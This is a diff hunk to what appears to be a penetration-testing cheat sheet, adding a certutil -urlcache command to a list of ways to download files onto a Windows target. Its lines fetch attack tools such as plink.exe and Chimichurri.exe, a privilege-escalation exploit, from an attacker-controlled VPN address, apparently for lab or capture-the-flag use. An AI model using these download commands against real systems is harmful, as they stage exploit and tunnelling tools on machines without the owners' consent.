@@ -1369,6 +1369,8 @@ privilege-escalation-awesome-scripts-suite)
 #### Useful Commands to get Files onto Windows Systems
 - `certutil -url -f "http://<Your VPN IP>/<File your trying to get on the system>" "<name of file to be downloaded>"`
   - Example: `certutil -url -f http://10.10.1.1/Chimichurri.exe chim.exe`
+- `certutil -urlcache -f http://<Your VPN IP>/<File you want> <Name you want it to be>`
+  - Example: `certutil -urlcache -f http://10.10.16.50/plink.exe plink.exe`
 - `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<VPN IP>:<PORT>/<File You want>', '<name of file to be downloaded & Path>"`
   - Example: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.50:2222/Chimichurri.exe', 'C:\Users\Public\Downloads\Chimichurri.exe')"`
 
